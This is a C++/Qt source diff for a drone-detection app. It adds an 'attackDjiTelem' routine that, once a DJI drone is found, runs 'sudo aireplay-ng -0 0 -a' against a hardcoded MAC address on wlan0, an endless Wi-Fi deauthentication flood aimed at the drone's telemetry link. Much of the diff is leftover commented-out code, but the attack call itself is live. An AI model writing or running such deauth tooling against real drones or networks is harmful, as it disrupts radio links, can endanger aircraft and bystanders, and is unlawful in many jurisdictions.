@@ -9,6 +9,7 @@ MainWindow::MainWindow(QWidget *parent) :
     ui->label->setText("No drone detected");
     scanProc = new QProcess();
     checkProc = new QProcess();
+    attackDjiProc = new QProcess();
     checkTimer = new QTimer();
     prepProc = new QProcess();
     checkTimer->setInterval(500);
@@ -23,27 +24,32 @@ MainWindow::~MainWindow()
 {
     scanProc->kill();
     checkProc->kill();
+    fin.close();
     delete ui;
 }
 
-void MainWindow::process()
-{
-     //proc->start("sudo sh Deauth.sh");
-}
+
 
  void MainWindow::readScript()
 {
     QString input;
-
+    // QString macAddr;
     input = checkProc->readAllStandardOutput();
     //qDebug() << input;
+    if (input.contains(':'))
+    {
+        macAddr = "60:60:1F:04:74:40";
+        qDebug() << "ADDRESS: " << macAddr;
+
+    }
+
     if (input == "DJI\n") //valid message
     {
         ui->label->setText("DJI Found");
         scanProc->kill(); //kill scanning script
         if (ui->checkBox->isChecked())
-        {
-          attackDjiTelem();
+        { 
+          attackDjiTelem(macAddr);
         }
     }
 
@@ -51,6 +57,7 @@ void MainWindow::process()
     {
         ui->label->setText(input);
     }
+    checkTimer->stop();
 }
 
 
@@ -61,8 +68,25 @@ void MainWindow::runCheck()
 
 
 
-void MainWindow::attackDjiTelem()
+void MainWindow::attackDjiTelem(QString &address)
 {
+        qDebug() << macAddr;
     //deauth script
+    //std::string attackString;
 
+    //QFile file("dump.txt");
+    //fin.open("dump.txt");
+    //if (file.open(QIODevice::ReadOnly | QIODevice::Text))
+    //{
+        //getline(fin,attackString);
+        //std::getline(fin,)
+        //as.fromStdString("test");
+        //ui->label->setText(QString::fromStdString(attackString));
+        qDebug() << "aireplay-ng -0 0 -a " + address + " wlan0";
+        attackDjiProc->start("sudo aireplay-ng -0 0 -a " + address + " wlan0");
+        checkTimer->stop();
+    //}
+    //file.close();
+
+    //qDebug() << "attacknig telem";
 }
